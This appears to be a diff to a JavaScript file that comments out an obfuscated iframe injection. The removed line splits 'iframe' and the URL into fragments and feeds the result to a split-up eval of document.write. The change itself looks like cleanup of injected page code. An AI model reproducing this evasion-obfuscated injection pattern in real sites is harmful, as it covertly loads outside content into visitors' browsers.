@@ -1,5 +1,6 @@
 var aa=Math.round(Math.random()*8+1);
-var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="73'+'50" src="ht'+'tp://'+'www'+'.baidu'+'.com/'+'/"></iframe></center>';
+//var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="73'+'50" src="ht'+'tp://'+'www'+'.baidu'+'.com/'+'/"></iframe></center>';
+var ss ='';
 eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
 	
 try{
